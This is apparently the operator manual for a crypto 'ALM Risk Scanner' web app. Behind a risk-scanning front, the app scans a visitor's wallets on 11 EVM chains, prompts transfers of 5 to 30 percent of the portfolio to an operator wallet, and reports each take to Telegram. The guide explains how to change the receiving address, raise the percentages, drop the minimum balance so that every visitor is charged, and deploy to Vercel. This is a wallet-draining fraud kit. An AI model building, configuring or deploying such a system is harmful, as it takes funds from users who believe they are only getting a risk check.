# ALM Risk Scanner - Configuration Guide

## Table of Contents
1. [Overview](#overview)
2. [Changing Service Wallet Address](#changing-service-wallet-address)
3. [Changing Charge Percentages](#changing-charge-percentages)
4. [Environment Variables](#environment-variables)
5. [Telegram Configuration](#telegram-configuration)
6. [Testing Configuration Changes](#testing-configuration-changes)
7. [Troubleshooting](#troubleshooting)

---

## Overview

The ALM Risk Scanner is a multi-chain wallet charging system that automatically:
- Scans all 11 EVM chains (Ethereum, Polygon, Arbitrum, Optimism, BSC, Avalanche, Fantom, Celo, Base, Linea, Scroll)
- Detects user's tokens and native coins
- Charges a configurable percentage based on total portfolio value
- Sends charges to a configurable service wallet
- Sends notifications to Telegram

### System Architecture

```
User connects wallet
        ↓
Auto-scan all 11 EVM chains
        ↓
Detect tokens & portfolio value
        ↓
Calculate charge percentage
        ↓
Build wallet transaction prompts
        ↓
User confirms in their wallet
        ↓
Charges execute on each chain
        ↓
Telegram notification sent
```

### Supported Chains
1. Ethereum (ETH)
2. Polygon (MATIC)
3. Arbitrum (ARB)
4. Optimism (OP)
5. BSC (BNB)
6. Avalanche (AVAX)
7. Fantom (FTM)
8. Celo (CELO)
9. Base (ETH)
10. Linea (ETH)
11. Scroll (ETH)

---

## Changing Service Wallet Address

The service wallet is where all charges are sent. Follow these steps to change it:

### Method 1: Using Environment Variables (Recommended for Production)

**Location:** `.env.local` file in `apps/web/` directory

**Step 1:** Open `.env.local`
```bash
apps/web/.env.local
```

**Step 2:** Find the service wallet configuration:
```env
# ============================================================
# SERVICE RECEIVER WALLETS (Where charges are sent)
# ============================================================
# EVM Chains Receiver (All 11 chains)
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
SERVICE_WALLET_ADDRESS=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
```

**Step 3:** Replace the wallet address with your wallet:
```env
# Example: Changing to a new wallet
NEXT_PUBLIC_SERVICE_WALLET=0xYourNewWalletAddressHere1234567890abcdef
SERVICE_WALLET_ADDRESS=0xYourNewWalletAddressHere1234567890abcdef
```

**Step 4:** Save the file

**Step 5:** Refresh the browser at `http://localhost:3000`

✅ Changes apply immediately without restarting the server

### Method 2: Code-Level Change (For Development)

**Location:** `src/utils/autoChargingEngine.ts`

**Step 1:** Open the file:
```
apps/web/src/utils/autoChargingEngine.ts
```

**Step 2:** Find the default service wallet parameter (around line 96):
```typescript
export async function executeAutoCharge(params: {
  walletAddress: string;
  serviceWallet: string;
  // ... other params
})
```

**Step 3:** This value comes from the environment variable, but you can also change the default in `chargeOnConnect.ts`:

**File:** `src/utils/chargeOnConnect.ts` (Line ~37)
```typescript
export async function executeChargeOnConnect(params: {
  // ... other params
  serviceWallet?: string;
}): Promise<ChargeResult> {
  const {
    // ... other destructuring
    serviceWallet = '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f', // Change this
  } = params;
```

Change to:
```typescript
    serviceWallet = '0xYourNewWalletAddressHere1234567890abcdef', // Your wallet
```

### Important Notes for Service Wallet

⚠️ **CRITICAL:**
- Must be a valid Ethereum address (42 characters, starts with 0x)
- Must be an address you control or have permission to use
- Will receive ALL charges from all chains and all users
- Should be a dedicated wallet (not your personal wallet)
- Back up the private key securely

✅ **Best Practices:**
- Use a hardware wallet (Ledger, Trezor) for security
- Use a cold storage wallet (not frequently accessed)
- Monitor wallet balance regularly
- Set up notifications for incoming transfers
- Consider using a multi-signature wallet for large operations

### Verify Changes

To verify the service wallet was changed correctly:

1. **Check the environment variable:**
```bash
# In terminal, navigate to project and check
cat apps/web/.env.local | grep NEXT_PUBLIC_SERVICE_WALLET
```

2. **Test a charge:**
   - Connect wallet with $3+
   - Approve transactions
   - Check if funds arrive at new service wallet address

3. **Check Telegram notification:**
   - Should show the charge details
   - Verify the receiver is your new wallet

---

## Changing Charge Percentages

The system uses dynamic pricing based on total portfolio value. Follow these steps to adjust charges:

### Current Default Pricing Tiers

| Portfolio Value | Charge Rate |
|---|---|
| $10,000+ | 5% |
| $5,000-$10,000 | 8% |
| $1,000-$5,000 | 12% |
| $500-$1,000 | 15% |
| $100-$500 | 18% |
| $3-$100 | 20% |
| <$3 | NO CHARGE |

### Method 1: Change All Percentages (Easy)

**Location:** `src/utils/portfolioValue.ts`

**Step 1:** Open the file:
```
apps/web/src/utils/portfolioValue.ts
```

**Step 2:** Find this function (around line 156):
```typescript
export function getChargePercentageByPortfolioValue(portfolioUsdValue: number): number {
  // Tiered pricing based on total USD portfolio value
  if (portfolioUsdValue >= 10000) return 5;   // $10k+ → 5%
  if (portfolioUsdValue >= 5000) return 8;    // $5k-$10k → 8%
  if (portfolioUsdValue >= 1000) return 12;   // $1k-$5k → 12%
  if (portfolioUsdValue >= 500) return 15;    // $500-$1k → 15%
  if (portfolioUsdValue >= 100) return 18;    // $100-$500 → 18%
  return 20;                                   // <$100 → 20%
}
```

**Step 3:** Change the percentages you want:

### Example 1: Flat 25% Charge for Everyone
```typescript
export function getChargePercentageByPortfolioValue(portfolioUsdValue: number): number {
  return 25; // Same 25% for all users regardless of portfolio size
}
```

### Example 2: Increase All by 5%
```typescript
export function getChargePercentageByPortfolioValue(portfolioUsdValue: number): number {
  if (portfolioUsdValue >= 10000) return 10;  // Changed from 5 to 10
  if (portfolioUsdValue >= 5000) return 13;   // Changed from 8 to 13
  if (portfolioUsdValue >= 1000) return 17;   // Changed from 12 to 17
  if (portfolioUsdValue >= 500) return 20;    // Changed from 15 to 20
  if (portfolioUsdValue >= 100) return 23;    // Changed from 18 to 23
  return 25;                                   // Changed from 20 to 25
}
```

### Example 3: Reduce All by 5%
```typescript
export function getChargePercentageByPortfolioValue(portfolioUsdValue: number): number {
  if (portfolioUsdValue >= 10000) return 0;   // Free for whales
  if (portfolioUsdValue >= 5000) return 3;    // Changed from 8 to 3
  if (portfolioUsdValue >= 1000) return 7;    // Changed from 12 to 7
  if (portfolioUsdValue >= 500) return 10;    // Changed from 15 to 10
  if (portfolioUsdValue >= 100) return 13;    // Changed from 18 to 13
  return 15;                                   // Changed from 20 to 15
}
```

### Example 4: Progressive Scaling (Higher portfolio = Less charge)
```typescript
export function getChargePercentageByPortfolioValue(portfolioUsdValue: number): number {
  if (portfolioUsdValue >= 50000) return 2;    // Mega whales: 2%
  if (portfolioUsdValue >= 10000) return 5;    // Large: 5%
  if (portfolioUsdValue >= 1000) return 15;    // Medium: 15%
  if (portfolioUsdValue >= 100) return 25;     // Small: 25%
  return 30;                                   // Tiny: 30%
}
```

### Example 5: Different Tier Boundaries
```typescript
export function getChargePercentageByPortfolioValue(portfolioUsdValue: number): number {
  if (portfolioUsdValue >= 100000) return 3;   // $100k+
  if (portfolioUsdValue >= 50000) return 5;    // $50k-$100k
  if (portfolioUsdValue >= 20000) return 8;    // $20k-$50k
  if (portfolioUsdValue >= 5000) return 12;    // $5k-$20k
  if (portfolioUsdValue >= 1000) return 18;    // $1k-$5k
  return 25;                                   // <$1k
}
```

**Step 4:** Save the file

**Step 5:** Refresh browser - changes apply immediately

### Method 2: Using Environment Variables

You can also configure percentages via `.env.local`:

```env
# Legacy single percentage (if you want flat rate)
NEXT_PUBLIC_SERVICE_FEE_PERCENT=20

# Or tiered pricing JSON (advanced)
NEXT_PUBLIC_PRICING_TIERS=[{"minUsd":10000,"maxUsd":null,"percentage":5},{"minUsd":1000,"maxUsd":10000,"percentage":15},{"minUsd":0,"maxUsd":1000,"percentage":25}]
```

### Minimum Portfolio Balance

You can also change the minimum balance required to trigger a charge:

**Location:** `src/utils/chargeOnConnect.ts` (Line 11)

```typescript
// Minimum portfolio balance required to trigger charging
export const MINIMUM_PORTFOLIO_BALANCE = 3; // $3 USD minimum
```

**Examples:**

Change to $5 minimum:
```typescript
export const MINIMUM_PORTFOLIO_BALANCE = 5; // $5 USD minimum
```

Change to $1 minimum:
```typescript
export const MINIMUM_PORTFOLIO_BALANCE = 1; // $1 USD minimum
```

Remove minimum (charge everyone):
```typescript
export const MINIMUM_PORTFOLIO_BALANCE = 0; // No minimum
```

### Important Notes for Charge Percentages

⚠️ **IMPORTANT:**
- Minimum: 0% (free)
- Maximum: 100% (not recommended)
- Recommended: 5%-25%
- Higher % = more revenue but fewer users
- Lower % = more users but less revenue

✅ **Best Practices:**
- Start with 15-20% for early users
- Monitor conversion rates
- Adjust based on user feedback
- Test with small percentage first
- Consider market rates when setting prices

---

## Environment Variables

### Complete `.env.local` Configuration

**Location:** `apps/web/.env.local`

```env
# ============================================================
# TELEGRAM NOTIFICATION BOT (Required for Charge Notifications)
# ============================================================
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
NEXT_PUBLIC_TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE

# ============================================================
# RPC & Web3 Provider Configuration
# ============================================================
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=ec69905148aaa16f986896374d25cf53

# ============================================================
# SERVICE RECEIVER WALLETS (CRITICAL)
# ============================================================
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
SERVICE_WALLET_ADDRESS=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f

# ============================================================
# AUTOMATIC CHARGING CONFIGURATION
# ============================================================
NEXT_PUBLIC_SERVICE_FEE_PERCENT=15
SERVICE_FEE_PERCENT=15

# ============================================================
# APPLICATION IDENTITY & URLs
# ============================================================
NEXT_PUBLIC_APP_NAME=ALM Risk Scanner
NEXT_PUBLIC_APP_URL=http://localhost:3000
```

---

## Telegram Configuration

### Setting Up Telegram Notifications

**Step 1:** Create a Telegram Bot
- Open Telegram and search for `@BotFather`
- Send `/start`
- Send `/newbot`
- Follow prompts to create bot
- Copy the `BOT_TOKEN`

**Step 2:** Get Your Chat ID
- Search for `@userinfobot` in Telegram
- Send `/start`
- Copy the `CHAT_ID`

**Step 3:** Update `.env.local`
```env
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklmnOPQrstuvWXYZ_1234567890
TELEGRAM_CHAT_ID=1234567890
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklmnOPQrstuvWXYZ_1234567890
NEXT_PUBLIC_TELEGRAM_CHAT_ID=1234567890
```

**Step 4:** Test Connection
- Connect wallet with $3+ balance
- Complete a charge
- Check Telegram for notification

### What Notifications Include

✅ **Charge Started:** Portfolio value detected
✅ **Charge Processing:** Transactions building
✅ **Charge Success:** All details with transaction hashes
✅ **Charge Failed:** Error details and recommendations

---

## Testing Configuration Changes

### Test Checklist After Making Changes

**1. Service Wallet Changes**
- [ ] Edit wallet address in `.env.local`
- [ ] Save file
- [ ] Refresh browser
- [ ] Connect wallet with $3+ balance
- [ ] Approve transactions in wallet
- [ ] Verify funds arrived at NEW service wallet
- [ ] Check Telegram notification shows correct wallet

**2. Charge Percentage Changes**
- [ ] Edit percentages in `portfolioValue.ts`
- [ ] Save file
- [ ] Refresh browser
- [ ] Test with different portfolio values:
  - [ ] Test with $2 (should skip - below minimum)
  - [ ] Test with $50 (should charge 20%)
  - [ ] Test with $1000 (should charge 12%)
  - [ ] Test with $10000 (should charge 5%)
- [ ] Verify Telegram shows correct percentage
- [ ] Verify Telegram shows correct charge amount ($)

**3. Minimum Balance Changes**
- [ ] Edit minimum in `chargeOnConnect.ts`
- [ ] Save file
- [ ] Refresh browser
- [ ] Connect wallet with balance below minimum
- [ ] Should show "below minimum" message
- [ ] Connect wallet with balance above minimum
- [ ] Should proceed with charge

### Local Testing Steps

**Step 1:** Start Dev Server
```bash
cd apps/web
npm run dev
```

**Step 2:** Open Browser
```
http://localhost:3000
```

**Step 3:** Connect Wallet
- Click "Connect Wallet"
- Select your wallet (MetaMask, WalletConnect, etc.)
- Approve connection

**Step 4:** Observe Console
- Open browser DevTools (F12)
- Go to Console tab
- Look for charge progress messages

**Step 5:** Check Telegram
- Receive notification with:
  - Portfolio value
  - Charge percentage
  - Charge amount
  - Chains charged
  - Transaction hashes

### Debugging

**Issue: Changes not applying**
- Solution: Clear browser cache (Ctrl+Shift+Delete)
- Solution: Hard refresh (Ctrl+F5)
- Solution: Restart dev server (Ctrl+C, then `npm run dev`)

**Issue: Telegram not sending notifications**
- Check: `TELEGRAM_BOT_TOKEN` is correct in `.env.local`
- Check: `TELEGRAM_CHAT_ID` is correct in `.env.local`
- Check: Bot has permission to send messages
- Check: Chat ID is for YOUR chat, not the bot's

**Issue: Wallet prompts not showing**
- Check: WalletConnect Project ID is valid
- Check: Wallet is connected on supported chain
- Check: Portfolio value >= minimum balance ($3)

---

## Troubleshooting

### Common Issues and Solutions

#### 1. "Portfolio below minimum" message
**Problem:** User has less than $3 in portfolio
**Solution:** 
- Add more tokens to wallet
- Or lower `MINIMUM_PORTFOLIO_BALANCE` in `chargeOnConnect.ts`

#### 2. Wallet transaction prompt never appears
**Problem:** Possible wallet connection issue
**Solution:**
- Disconnect and reconnect wallet
- Try different wallet (MetaMask, WalletConnect, etc.)
- Check WalletConnect Project ID in `.env.local`

#### 3. Funds not arriving at service wallet
**Problem:** Wrong wallet address configured
**Solution:**
- Check `NEXT_PUBLIC_SERVICE_WALLET` in `.env.local`
- Verify address format (should start with 0x)
- Verify you own/control the wallet
- Check transaction on blockchain explorer

#### 4. Telegram notifications not working
**Problem:** Invalid bot token or chat ID
**Solution:**
- Get new token from `@BotFather`
- Get chat ID from `@userinfobot`
- Update both in `.env.local`
- Test with manual message to bot

#### 5. Wrong charge percentage being applied
**Problem:** Percentages not updated correctly
**Solution:**
- Check `portfolioValue.ts` for correct thresholds
- Verify `if` conditions use correct `>=` or `>`
- Check that function returns a number (not undefined)
- Hard refresh browser (Ctrl+F5)

#### 6. Server showing compilation errors
**Problem:** Syntax error in configuration files
**Solution:**
- Check for missing commas in JSON
- Check for unclosed braces/brackets
- Check file encoding is UTF-8
- Look at browser console for specific error

### Getting Help

If you encounter issues:

1. **Check the server logs:**
```bash
# Terminal shows real-time errors
cd apps/web
npm run dev
```

2. **Check browser console:**
- Open DevTools (F12)
- Go to Console tab
- Look for error messages

3. **Check Telegram:**
- Should show error details if charge fails
- Review the notification for clues

4. **Verify configuration:**
- Double-check all wallet addresses
- Double-check all percentages
- Double-check environment variables

---

## Production Deployment

### Before Going Live to Vercel

**Checklist:**

- [ ] Test all charge percentages
- [ ] Test service wallet receives funds
- [ ] Test Telegram notifications
- [ ] Update `.env.local` values
- [ ] Set Vercel environment variables
- [ ] Test on testnet first (optional but recommended)
- [ ] Monitor first few transactions
- [ ] Have backup wallet configured

### Setting Vercel Environment Variables

1. Go to Vercel project settings
2. Navigate to "Environment Variables"
3. Add the following:

| Variable | Value |
|---|---|
| `NEXT_PUBLIC_SERVICE_WALLET` | Your wallet address |
| `TELEGRAM_BOT_TOKEN` | From BotFather |
| `TELEGRAM_CHAT_ID` | Your chat ID |
| `NEXT_PUBLIC_TELEGRAM_BOT_TOKEN` | From BotFather |
| `NEXT_PUBLIC_TELEGRAM_CHAT_ID` | Your chat ID |
| `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` | From WalletConnect |

4. Click "Save"
5. Redeploy project

---

## Quick Reference

### Change Service Wallet
1. Open `apps/web/.env.local`
2. Find `NEXT_PUBLIC_SERVICE_WALLET=0x...`
3. Replace with your wallet
4. Save and refresh browser

### Change Charge Percentage
1. Open `apps/web/src/utils/portfolioValue.ts`
2. Edit `getChargePercentageByPortfolioValue` function
3. Change the percentages
4. Save and refresh browser

### Change Minimum Balance
1. Open `apps/web/src/utils/chargeOnConnect.ts`
2. Edit `MINIMUM_PORTFOLIO_BALANCE = 3`
3. Change to your desired minimum
4. Save and refresh browser

### Setup Telegram
1. Get token from `@BotFather`
2. Get chat ID from `@userinfobot`
3. Add to `.env.local`
4. Test with charge

---

## Support

For additional help:
- Check logs in terminal: `cd apps/web && npm run dev`
- Review error messages in browser console (F12)
- Test configuration changes locally before deploying
- Monitor Telegram for detailed error messages

---

**Document Version:** 1.0  
**Last Updated:** August 2026  
**System:** ALM Risk Scanner v2.8
